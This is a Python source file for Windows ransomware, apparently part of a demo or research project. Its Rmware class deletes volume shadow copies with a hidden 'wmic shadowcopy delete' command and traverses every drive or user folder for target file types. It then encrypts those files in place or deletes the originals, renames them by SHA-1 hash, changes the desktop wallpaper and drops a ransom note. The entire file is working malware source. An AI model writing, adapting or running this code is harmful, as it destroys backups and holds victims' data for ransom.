from os.path import isfile, isdir
from os import rename, remove
from subprocess import call  # nosec
from demos.fokusrnware.native.ransomware.Encrypter import Encrypter
from win32api import GetLogicalDriveStrings
from glob import glob
from ctypes import windll
from concurrent.futures import ThreadPoolExecutor

'''
    The class starts with classic ransomware features like deleting backups,
    (in this case shadow copys), continuing with path traversal,
    which idetifies all target files in the system. The files are then
    encrypted and the names are hashed. Then the background
    is changed and a ransom note is placed in the user's desktop.
'''


class Rmware:

    # Flag for not opening new console, when executing a shell command
    CREATE_NO_WINDOW = 0x08000000
    # Flag for changing the background of the desktop
    SPI_SETDESKWALLPAPER = 20

    def __init__(self, threadsNum=0, displayEmails=False, driveList=list(),
                 fileSuffixList=list(), filesToEncrypt=list(),
                 encr=Encrypter(), desktopBackground="",
                 ransomnote="", fileMod="inplace", user="",
                 encArea="desktop", dirBlacklist=list()) -> None:
        self.threadsNum = threadsNum
        self.driveList = driveList
        self.fileSuffixList = fileSuffixList
        self.filesToEncrypt = filesToEncrypt
        self.encr = encr
        self.desktopBackground = desktopBackground
        self.ransomnote = ransomnote
        self.fileMod = fileMod
        self.user = user
        self.encArea = encArea
        self.dirBlacklist = dirBlacklist

    '''
        Changes the background with a native DLL
        @param pathToPic: Path to the .jpg file
    '''

    def changeBackground(self) -> None:
        if self.desktopBackground == "":
            return
        windll.user32.SystemParametersInfoW(
            self.SPI_SETDESKWALLPAPER, 0, self.desktopBackground, 3)

    '''
        Deletes the shadow copies, which are used for restoring previous
        versions of files
        For this method administrative rights are necessary
    '''

    def delShadowCopy(self) -> None:
        # uses wmic to delete all shadowcopies on the system
        # (must be executet with elevated / admin rights)
        call('cmd /c wmic shadowcopy delete', shell=False,
             creationflags=self.CREATE_NO_WINDOW)  # nosec

    '''
        Lists all drives on the windows-system.
    '''

    def listDrives(self) -> None:
        drives = GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        for i in range(len(drives)):
            drives[i] = drives[i].replace("\\", "")
        self.driveList = drives

    '''
        Uses the method "dirTraversal" and checks which option was choosed
        for encArea
    '''

    def listFilesForEnc(self) -> None:
        if self.encArea == "drives":
            for drive in self.driveList:
                self.dirTraversal(drive)
        elif self.encArea == "root":
            self.dirTraversal("")
        elif self.encArea == "user":
            self.dirTraversal("\\Users\\" + self.user)
        else:
            self.dirTraversal("\\Users\\" + self.user + "\\Desktop")

    '''
        Recursivly enters directories and appends matching files to the
        filesToEncrypt-list
        @param dir: directory, whose files and directories get listed
    '''

    def dirTraversal(self, dir) -> None:
        dirContent = glob(dir + "\\*")
        for file in dirContent:
            if isfile(file) and file.split(".")[-1] in self.fileSuffixList:
                self.filesToEncrypt.append(file)
            elif isdir(file) and file.split("\\")[-1] not in self.dirBlacklist:
                self.dirTraversal(file)

    '''
        Encrypts a file with the encrypter and replaces its filename
        @param filePath: Path to the file, which will be encrypted
    '''

    def overwriteEnc(self, filePath) -> None:  # modifys the orginal file
        try:
            with open(filePath, 'rb+') as f:
                data = f.read()
                cipher = self.encr.enc(data)
                f.truncate(0)  # delete contents of file from position 0
                f.seek(0)  # set position back to 0
                f.write(cipher)  # write cipher in file
                f.close()
                path = filePath.replace(filePath.split("\\")[-1], "")
                rename(filePath, path +
                       self.encr.fileNameByHashSHA1(filePath.split('\\')[-1]))
        except PermissionError:
            pass
        except FileNotFoundError:
            pass

    '''
        Copys the orginal file, encrypts the copy and deletes the orginal one
        @param filePath: Path to the file, which will be copied
    '''

    # creates a encrypted copy and deletes the orginal
    def copyFileEnc(self, filePath) -> None:
        try:
            orginal = open(filePath, 'rb+')
            data = orginal.read()
            orginal.close()
            cipher = self.encr.enc(data)
            # full path of the directory, where the orginal is saved
            path = filePath.replace(filePath.split("\\")[-1], "")
            # create and open new file for saving the cipher
            copy = open(
                path + self.encr.fileNameByHashSHA1(
                    filePath.split('\\')[-1]), 'wb')
            copy.write(cipher)  # save cipher in copy file
            copy.close()
            remove(filePath)  # remove orginal file
        except PermissionError:
            pass
        except FileNotFoundError:
            pass

    '''
        Uses a file-encryption-method based on the choice of the user
        Furthermore threads will be used, if "threadsnum" in RWBuildData is > 0
    '''

    def encFiles(self) -> None:
        self.listDrives()
        self.listFilesForEnc()
        useThreads = False
        if self.threadsNum > 0:
            useThreads = True
        func = None
        if self.fileMod == "copy":
            func = self.copyFileEnc
        else:
            func = self.overwriteEnc
        if useThreads is True:
            with ThreadPoolExecutor(max_workers=self.threadsNum) as executor:
                executor.map(func, self.filesToEncrypt)
        else:
            for file in self.filesToEncrypt:
                func(file)

    '''
        Drops the ransomnote into the desktop of the current user
    '''

    def placeRansom(self) -> None:
        if self.ransomnote == "":
            return
        ransom = open(self.ransomnote, "rb")
        rContent = ransom.read()
        ransom.close
        ransomDesktop = open("\\Users\\" + self.user +
                             "\\Desktop\\Lösegeldaufforderung.docx", "wb")
        ransomDesktop.write(rContent)
        ransomDesktop.close()
